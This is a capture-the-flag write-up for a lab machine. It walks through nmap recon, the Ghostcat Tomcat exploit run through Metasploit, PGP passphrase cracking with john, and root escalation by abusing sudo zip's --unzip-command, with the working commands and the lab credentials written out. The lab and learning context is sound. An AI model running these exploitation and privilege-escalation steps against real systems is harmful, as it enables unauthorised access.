[[CTF Notes]]

---
## Target IP: 10.10.135.196

### Recon

```
nmap -O -sV 10.10.135.196
```

### Open Ports:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
```
### Exploit 

- Apache Tomcat/9.0.30

- $CATALINA_HOME/conf/tomcat-users.xml

- use metasploit:

```
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.10.135.196
set RPORT 8009
run
```

- we find:

Welcome to GhostCat
skyfuck:8730281lkjlkjdqlksalks

## SSH

- use the above credentials and we successfully log in using ssh on the target ip

- In home directory, we find:

tryhackme.asc (PGP private key)

credential.pgp (encrypted file)

- use pgp2john to get a hash from the file to crack using johntheripper:

`gpg2john tryhackme.asc > tryhackme.hash`

`john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.hash
`
- alexandru        (tryhackme)  

## Decrypting

- Import the private key:

`gpg --import tryhackme.asc`

- Decrypt the encrypted file:

`gpg --decrypt credential.pgp`

- new credentials: 

`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

## SSH as merlin

```bash
ssh merlin@10.10.135.196
```
- Grab the user flag

##  Privilege Escalation to Root

`sudo -l` :

```python
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
``` 

## GTFObins

```bash
TF=$(mktemp -d)
echo '#!/bin/bash
echo ROOT ACCESS GRANTED
/bin/bash' > $TF/x
chmod +x $TF/x
sudo zip -q /tmp/test.zip /etc/hosts -T --unzip-command=$TF/x

```

- This drops us into a root shell via abuse of the --unzip-command flag on zip.

- Read the root flag:

`cat /root/root.txt`

